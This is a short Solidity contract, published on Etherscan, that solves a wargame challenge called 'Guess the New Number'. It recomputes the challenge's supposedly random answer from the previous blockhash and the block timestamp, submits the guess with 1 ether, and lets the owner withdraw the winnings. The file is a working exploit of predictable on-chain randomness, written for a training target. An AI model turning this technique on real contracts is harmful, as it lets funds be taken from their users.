/**
 *Submitted for verification at Etherscan.io on 2021-10-31
*/

// SPDX-License-Identifier: NONE

pragma solidity 0.8.4;



// Part: IGuessTheNewNumberChallenge

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

// File: solveguess.sol

contract GuessSolver {
  IGuessTheNewNumberChallenge gnc;//  = IGuessTheNewNumberChallenge(0x9A62570426E46F970471d8e1bD1694c6E7e5F388);
  address payable public owner;
  
  constructor(address _a) payable {
	  gnc = IGuessTheNewNumberChallenge(_a);
        owner = payable(msg.sender);
  }

  function processAnswer() public view returns(uint8){
    return uint8(
        uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp
                )
	        )
        )
    );
  }
    
  function solve() external payable{
    uint8 answer = processAnswer();
    gnc.guess{value :1 ether}(answer);
    require(gnc.isComplete(), "NOK");
  }

   function withdraw() public {
        uint amount = address(this).balance;
	require(msg.sender == owner);
        // send all Ether to owner
        // Owner can receive Ether since the address of owner is payable
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Failed to send Ether");
    }

}